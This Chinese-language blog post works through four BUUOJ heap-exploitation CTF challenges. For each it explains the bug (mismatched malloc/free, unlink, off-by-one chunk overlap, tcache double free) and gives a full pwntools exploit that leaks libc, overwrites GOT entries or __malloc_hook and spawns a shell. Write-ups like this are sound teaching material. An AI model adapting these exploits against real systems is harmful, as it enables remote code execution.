# pwn初学者的进阶（三）：堆学习


## 0x00 前言
零零散散地看了两三天时间才把堆的一些基础内容与一道题看懂😑

## 0x01 picoctf_2018_are you root
[题目链接](https://buuoj.cn/challenges#picoctf_2018_are%20you%20root)

~~感天动地，我居然自己做出了一道堆题，虽然这题非常简单。~~

这题好像跟堆的机制也没啥大关系...

每次`login`的时候，chunk布局如下所示（假设输入用户名长度<=0x18）：
```
------------------
|       |  0x21 |  allocated
-----------------
|str_ptr| level |
------------------
|       |  0x21 |  allocated
-----------------
| str content.. |
------------------
    top chunk
```

这题的漏洞点在于，`malloc`与`free`的次数不匹配。程序中写入用户名时使用了`strdup`，**这个函数是隐含着`malloc`的调用的，而`reset`时又只进行了一次`free`调用。所以，正常的一次`login`与`reset`操作之后，chunk与fastbin的情况为：
```
------------------
|       |  0x21 |  allocated
-----------------
|str_ptr| level |
------------------
|       |  0x21 |  free
-----------------
| str content.. |
------------------
    top chunk

===================
fastbin: -> -----------------
            |       |  0x21 | 
            -----------------
            | str content.. |
            ------------------
```
所以这时再进行`login`，得到的就是写入了用户名内容的chunk，这是我们可控的。而代表auth-level的值就位于`ptr+0x8`，我们只要在第一次`login`的时候，把该处内容写为`\x05\x00\x00\x00\x00\x00\x00\x00`，然后`reset`，再`login`即可。

exp
```python
from pwn import *
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

p = remote('node4.buuoj.cn', 29378)

def get_flag():
    p.recvuntil(b'Enter your command:\n> ')
    p.sendline(b'get-flag')

def login(content: bytes):
    p.recvuntil(b'Enter your command:\n> ')
    p.sendline(b'login ' + content)

def reset():
    p.recvuntil(b'Enter your command:\n> ')
    p.sendline(b'reset')

payload = b'a'*0x8 + b'\x05'.ljust(8, b'\x00')

login(payload)
reset()
login(b'test')
get_flag()
p.interactive()
```

![image-20210906144421764](image-20210906144421764.png "flag截图")

ps: `#define DWORD __uint32_t`，所以`DWORD`在x86/x64都是**4字节**大小，而不是字面意思的2倍字长。

## 0x02 hitcon2014_stkof

[题目链接](https://buuoj.cn/challenges#hitcon2014_stkof)

> libc version: Ubuntu GLIBC 2.23-0ubuntu10

堆溢出，unlink利用。能够实现修改某个地址`addr`处的值为`addr-0x18`，在本题中则是修改记录chunk信息的`heapArray`数组中的值，实现`heapArray[2] = &heapArray[2]-0x8`。

如果对于2.23版本中unlink的内容不太记得了，可以去翻一下[ctf-wiki](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unlink/)。

```python
from pwn import *
context.os = 'linux'
context.arch = 'amd64'
context.log_level = 'debug'

context.terminal = ["tmux","splitw","-h"]
# p = remote('')
if args.LOCAL:
    # 本地用2.23libc调试
    ld_path = '/home/leo/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so'
    libc_path = '/home/leo/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so'
    # libc_path = './libc.so.6'
    p = process([ld_path, './stkof'], env = {'LD_PRELOAD': libc_path})
    gdb.attach(p)
else:
    libc_path = './libc.so.6'
    p = remote('node4.buuoj.cn', 26958)

def add(size: int):
    p.sendline(b'1')
    p.sendline(str(size).encode())
    p.recvuntil(b'OK\n')

def edit(index: int, size: int, content: bytes):
    p.sendline(b'2')
    p.sendline(str(index).encode())
    p.sendline(str(size).encode())
    assert len(content) == size, "make sure you entered the correct input"
    p.send(content)

def delete(index: int):
    p.sendline(b'3')
    p.sendline(str(index).encode())

def show(index: int):
    p.sendline(b'4')
    p.sendline(str(index).encode())


s_addr = 0x602140
libc = ELF(libc_path)
e = ELF('./stkof')

# 程序在调用fgets和printf之前没用执行setbuf操作，所以第一次调用fgets和printf的时候，这两个函数会申请chunk。
# 导致第一个申请的堆块与其它堆块不连续。
add(0x1000) # idx 1
# 申请3个连续的堆块
add(0x90) # idx 2
add(0x80) # idx 3
add(0x10) # idx 4

# 通过堆溢出改写chunk3的prev_inuse位，并且构造fake chunk
# fake chunk的fd->bk和bk->fd指向s[2]
payload1 = b'a'*8 + p64(0x91)
payload1 += p64(s_addr-8) + p64(s_addr)
payload1 = payload1.ljust(0x90, b'a')
payload1 += p64(0x90) + p64(0x90)

edit(2, len(payload1), payload1)

# free chunk3，触发对于chun2的unlink操作，改写s[2]内容为&s[2]-0x18
delete(3)

# 修改s数组内容
payload2 = b'a'*8
payload2 += p64(e.got['strlen']) # s[0]
payload2 += p64(e.got['free'])   # s[1]
edit(2, len(payload2), payload2)

# 修改strlen@got为puts@plt
edit(0, 8, p64(e.plt['puts']))

# 泄露free@got内容
show(1)

# 计算libc基址
free_address = u64(p.recvuntil(b'\x7f')[-6:]+b'\x00'*2)
libc_base = free_address - libc.sym['free']
system_addr = libc_base + libc.sym['system']

# 修改free@got
edit(1, 8, p64(system_addr))

# 写入 "/bin/sh"，执行system("/bin/sh")
edit(4, 8, b'/bin/sh\x00')
delete(4)

p.interactive()
```

## 0x03 npuctf_2020_easyheap

[题目链接](https://buuoj.cn/challenges#npuctf_2020_easyheap)

> libc version: [Ubuntu GLIBC 2.27-3ubuntu1](https://libc.blukat.me/d/libc6_2.27-3ubuntu1_amd64.so)

2.27，off-by-one导致堆块重叠。free之后再分配可以使得分配的堆块重叠，从而造成覆盖指针。接着就是泄露libc＋改got表。

```python
from pwn import *

context(log_level = "debug")
context(os="linux", arch="amd64")

if args.REMOTE:
    p = remote('node4.buuoj.cn', 29292)
else:
    context.terminal = ["tmux","splitw","-h"]
    p = process('./npuctf_2020_easyheap')
    gdb.attach(p)

def create(size: int, content: bytes):
    assert size == 0x18 or size == 0x38, "wrong size"
    p.sendlineafter(b'Your choice :', b'1')
    p.sendlineafter(b'Size of Heap(0x10 or 0x20 only) :', str(size).encode())
    p.sendafter(b'Content:', content)

def edit(index: int, content: bytes):
    p.sendlineafter(b'Your choice :', b'2')
    p.sendlineafter(b'Index :', str(index).encode())
    p.sendafter(b'Content: ', content)

def show(index: int):
    p.sendlineafter(b'Your choice :', b'3')
    p.sendlineafter(b'Index :', str(index).encode())
    
def delete(index: int):
    p.sendlineafter(b'Your choice :', b'4')
    p.sendlineafter(b'Index :', str(index).encode())

e = ELF('./npuctf_2020_easyheap')
libc = ELF('./libc6_2.27-3ubuntu1_amd64.so')
# 下面这个glibc-all-in-one的libc2.27不对，可能是版本高了一点。
# libc = ELF('/home/leo/tools/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc-2.27.so')
# print(hex(libc.sym['free']))

# 通过覆盖size域来实现堆块重叠，再delete，然后malloc(0x38)和malloc(0x10)就会造成数据堆块与管理堆块重叠。
# 接着就可以控制管理堆块上记录的指针，实现got表地址的读取与修改
create(0x18, b'/bin/sh\x00') # id0
create(0x18, b'a'*8) # id1

# overlap chunk
edit(0, b'/bin/sh\x00'+b'a'*0x10 + b'\x41')

# chunk被放入tcache bin时，系统不会将其下一个chunk的prev_inuse清0，所以这里不用担心最后的chunk被free之后与top chunk合并
delete(1)
create(0x38, b'c'*8) # id1
edit(1, b'c'*0x18 + p64(0x21) + p64(0x38) + p64(e.got['free']))

# leak libc
show(1)
free_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\00'))
libc_base = free_addr - libc.sym['free']
p.success(hex(libc_base))
system_addr = libc_base + libc.sym['system']

# modify free@got
edit(1, p64(system_addr))
delete(0)

p.interactive()
```

## 0x04 ciscn_2019_final_3

[题目链接](https://buuoj.cn/challenges#ciscn_2019_final_3)

> libc version: Ubuntu GLIBC 2.27-3ubuntu1

新类型，之前没做过。

2.27的tcache bin在程序未置零free之后的指针时是可以double free的，2.28才加入了key来防止double free。而double free可以造成tcache dup，接着可以任意地址malloc。

这题就是利用该操作，通过任意地址malloc改写chunk的size，使其free的时候进入到unsorted bin，然后泄露libc。接着改写malloc_hook为one gadget。

```python
from pwn import *

'''
❯ one_gadget ./libc.so.6
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''
context(os = "linux", arch = "amd64")
context(log_level = "debug")

libc = ELF('./libc.so.6')

if args.REMOTE:
    p = remote('node4.buuoj.cn', 27792)
else:
    context.terminal = ["tmux", "splitw", "-h"]
    p = process('./ciscn_final_3', env={'LD_PERLOAD': './libc.so.6'})
    gdb.attach(p)

def add(index: int, size: int, content: bytes):
    p.sendlineafter(b'choice > ', b'1')
    p.sendlineafter(b'index\n', str(index).encode())
    p.sendlineafter(b'size\n', str(size).encode())
    p.sendlineafter(b'something\n', content)
    p.recvuntil(b'gift :')
    return int(p.recv(14).decode(), 16)

def remove(index: int):
    p.sendlineafter(b'choice > ', b'2')
    p.sendlineafter(b'index\n', str(index).encode())

heap = add(0, 0x78, b'a') #0
# p.info("heap: "+hex(heap))
add(1, 0x18, b'b') #1
add(2, 0x78, b'c') #2
add(3, 0x78, b'd') #3
add(4, 0x78, b'c') #4
add(5, 0x78, b'd') #5 
add(6, 0x78, b'c') #6
add(7, 0x78, b'd') #7 
add(8, 0x78, b'c') #8
# ======= 0x421 chunk to here ========
add(9, 0x78, b'd') #9 
add(10, 0x78, b'c') #10
add(11, 0x78, b'd') #11
add(12, 0x28, b'd') #12

# double free, create tcache dup
remove(12)
remove(12)

add(13, 0x28, p64(heap-0x10)) # tcache bin won't check the size of the chunk. so we don't have to find the '0x7f' or other value in memory
add(14, 0x28, p64(heap-0x10))

# make overlap, modify the size of chunk 0 to 0x420
add(15, 0x28, p64(0) + p64(0x421))

remove(0) # send chunk 0 to unsorted bin
remove(1) # send chunk 1 to tcache bin
add(16, 0x78, b'a') # move main_arena pointer to chunk 1
add(17, 0x18, b'a')
main_arena = add(18, 0x18, b'a') - 0x60
malloc_hook = main_arena - 0x10
libc_base = malloc_hook - libc.sym['__malloc_hook']
one_gadget = libc_base + 0x10a38c # 0x4f322 不行

p.success("got libc base: "+hex(libc_base))
p.success("cal onegadget: "+hex(one_gadget))

# dup again
remove(5)
remove(5)
add(19, 0x78, p64(malloc_hook))
add(20, 0x78, p64(malloc_hook))
add(21, 0x78, p64(one_gadget))

# trigger malloc & get shell
p.sendlineafter(b'choice > ', b'1')
p.sendlineafter(b'index\n', b'22')
p.sendlineafter(b'size\n', b'0')

p.interactive()
```


